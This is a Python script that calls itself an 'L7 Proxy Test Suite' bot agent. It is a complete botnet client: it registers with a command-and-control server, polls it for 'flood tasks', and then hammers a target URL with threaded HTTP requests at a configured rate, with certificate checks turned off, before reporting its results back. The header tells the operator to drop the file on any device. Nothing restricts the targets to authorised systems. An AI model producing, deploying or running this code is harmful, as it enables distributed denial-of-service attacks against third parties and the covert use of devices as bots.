#!/usr/bin/env python3
"""
L7 Proxy Test Suite — Bot Agent
================================
C2: __C2_HOST__:__C2_PORT__

Drop this file on any device and run:  python3 agent.py
It will self-register with the C2 server and await flood tasks.

Pure stdlib — no pip required.  Works on Windows, macOS, Linux.
"""

import os
import sys
import uuid
import json
import time
import socket
import platform
import threading
import ssl
import urllib.request
import urllib.error
import concurrent.futures

# ── Baked-in C2 config ────────────────────────────────────────────────────────
C2_HOST = "__C2_HOST__"
C2_PORT = int("__C2_PORT__")
C2_BASE = "http://{}:{}".format(C2_HOST, C2_PORT)

# ── Agent identity (persistent across restarts via local file) ─────────────────
ID_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".agent_id")

def _load_or_create_id():
    if os.path.isfile(ID_FILE):
        try:
            return open(ID_FILE).read().strip()
        except Exception:
            pass
    aid = "agent-" + str(uuid.uuid4())[:8]
    try:
        with open(ID_FILE, "w") as f:
            f.write(aid)
    except Exception:
        pass
    return aid

AGENT_ID  = _load_or_create_id()
HOSTNAME  = socket.gethostname()
PLATFORM  = platform.system() + " " + platform.release()

# ── Flood state ───────────────────────────────────────────────────────────────
_STOP  = threading.Event()
_BUSY  = threading.Event()   # set while a flood is running

# ── Helpers ───────────────────────────────────────────────────────────────────
def _post(path, data):
    body = json.dumps(data).encode()
    req  = urllib.request.Request(
        C2_BASE + path, data=body,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"ok": False, "error": str(e)}

def _get(path):
    try:
        req = urllib.request.Request(C2_BASE + path)
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ── Single HTTP request through NO proxy (agent sends directly) ───────────────
def _fire(target_url, method, idx):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    import http.client
    from urllib.parse import urlparse
    t0 = time.time()
    try:
        parsed = urlparse(target_url)
        body_data = None
        if method in ("POST", "PUT", "PATCH"):
            body_data = json.dumps({"probe": "l7_agent", "idx": idx}).encode()
        req = urllib.request.Request(target_url, data=body_data, method=method)
        if body_data:
            req.add_header("Content-Type", "application/json")
        handler = urllib.request.HTTPSHandler(context=ctx)
        opener  = urllib.request.build_opener(handler)
        with opener.open(req, timeout=10) as r:
            r.read()
            status = r.status
        return True, (time.time()-t0)*1000, status
    except urllib.error.HTTPError as e:
        return False, (time.time()-t0)*1000, e.code
    except Exception:
        return False, 0.0, 0

# ── Flood executor ────────────────────────────────────────────────────────────
def _run_flood(task):
    _BUSY.set()
    _STOP.clear()
    target   = task.get("target", "")
    method   = task.get("method", "GET").upper()
    workers  = max(1, int(task.get("workers", 20)))
    rps      = max(0.1, float(task.get("rps", 50)))
    duration = max(1.0, float(task.get("duration", 30)))
    task_id  = task.get("task_id", "unknown")

    total = [0]; success = [0]; errors = [0]
    lock  = threading.Lock()
    interval  = 1.0 / rps if rps > 0 else 0.0
    wall_start = time.time()
    deadline   = wall_start + duration

    def _worker(idx):
        ok, ms, status = _fire(target, method, idx)
        with lock:
            total[0]   += 1
            if ok: success[0] += 1
            else:  errors[0]  += 1

    idx = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        futs = []
        while time.time() < deadline and not _STOP.is_set():
            t0 = time.time()
            futs.append(pool.submit(_worker, idx))
            idx += 1
            futs = [f for f in futs if not f.done()]
            sl = interval - (time.time()-t0)
            if sl > 0:
                time.sleep(sl)
        for f in futs:
            try: f.result(timeout=15)
            except Exception: pass

    wall = time.time() - wall_start
    rps_actual = round(total[0]/wall, 1) if wall > 0 else 0
    _post("/api/agent/result", {
        "agent_id":   AGENT_ID,
        "task_id":    task_id,
        "total":      total[0],
        "success":    success[0],
        "errors":     errors[0],
        "rps_actual": rps_actual,
        "wall":       round(wall, 2),
    })
    print("[agent] Task {} done: {} sent, {} rps".format(task_id, total[0], rps_actual))
    _BUSY.clear()

# ── Main loop ─────────────────────────────────────────────────────────────────
def main():
    print("[agent] ID: {}  C2: {}:{}".format(AGENT_ID, C2_HOST, C2_PORT))

    # Register
    while True:
        r = _post("/api/agent/register", {
            "id":       AGENT_ID,
            "hostname": HOSTNAME,
            "platform": PLATFORM,
            "ip":       socket.gethostbyname(HOSTNAME),
        })
        if r.get("ok"):
            print("[agent] Registered with C2")
            break
        print("[agent] Registration failed: {} — retrying in 5s".format(r.get("error","")))
        time.sleep(5)

    # Poll loop
    while True:
        try:
            # Heartbeat
            _post("/api/agent/ping", {"id": AGENT_ID})

            # Poll for task only if not busy
            if not _BUSY.is_set():
                r = _get("/api/agent/task?id=" + AGENT_ID)
                if r.get("task"):
                    task = r["task"]
                    print("[agent] Received task: {}".format(task.get("task_id")))
                    t = threading.Thread(target=_run_flood, args=(task,), daemon=True)
                    t.start()
                elif r.get("stop") and _BUSY.is_set():
                    _STOP.set()
                    print("[agent] Stop command received")

        except Exception as exc:
            print("[agent] Poll error: {}".format(exc))

        time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[agent] Stopped.")
